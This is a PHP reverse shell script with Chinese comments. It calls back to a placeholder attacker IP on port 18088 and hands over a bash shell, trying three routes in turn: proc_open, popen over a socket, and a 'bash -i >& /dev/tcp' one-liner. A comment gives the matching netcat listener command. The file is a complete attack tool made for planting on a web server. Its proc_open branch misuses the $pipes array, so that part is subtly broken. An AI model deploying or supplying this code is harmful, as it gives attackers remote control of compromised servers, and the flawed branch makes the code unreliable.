<?php
set_time_limit(0);
ignore_user_abort(true);

$ip = 'YOUR_ATTACKER_IP';
$port = 18088;

function reverse_shell($ip, $port) {
    // 第一层：proc_open (最稳定，支持交互式)
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );

        // 尝试连接
        if (function_exists('fsockopen')) {
            $sock = fsockopen($ip, $port);
        } elseif (function_exists('stream_socket_client')) {
            $sock = stream_socket_client("tcp://$ip:$port");
        } else {
            return false;
        }

        if ($sock) {
            $process = proc_open('/bin/bash', $descriptorspec, $pipes);
            if (is_resource($process)) {
                // 非阻塞模式可能需要设置，但在简单循环中通常可行
                while (!feof($sock)) {
                    if (feof($pipes)) break;

                    // 读取来自攻击者的命令
                    $cmd = fread($sock, 1024);
                    if ($cmd === false || $cmd === '') break;

                    // 执行命令
                    fwrite($pipes, $cmd);

                    // 获取输出
                    $stdout = fread($pipes, 1024);
                    $stderr = fread($pipes, 1024);

                    // 返回结果
                    fwrite($sock, $stdout . $stderr);
                }
                fclose($pipes);
                fclose($pipes);
                fclose($pipes);
                proc_close($process);
                fclose($sock);
                return true;
            }
            fclose($sock);
        }
    }

    // 第二层：popen + stream_socket_client (半交互，适合单命令)
    if (function_exists('popen') && function_exists('stream_socket_client')) {
        $sock = stream_socket_client("tcp://$ip:$port");
        if ($sock) {
            while (!feof($sock)) {
                $cmd = fread($sock, 1024);
                if ($cmd === false || $cmd === '') break;

                $handle = popen($cmd, 'r');
                if ($handle) {
                    while (!feof($handle)) {
                        fwrite($sock, fread($handle, 1024));
                    }
                    pclose($handle);
                }
            }
            fclose($sock);
            return true;
        }
    }

    // 第三层：/dev/tcp (依赖bash，无需PHP特殊函数，但需exec/system可用)
    if (function_exists('exec') || function_exists('system')) {
        $cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1";
        if (function_exists('exec')) exec($cmd);
        else system($cmd);
        return true;
    }

    return false;
}

// 执行反弹   nc -l -vv -p 18088
reverse_shell($ip, $port);
?>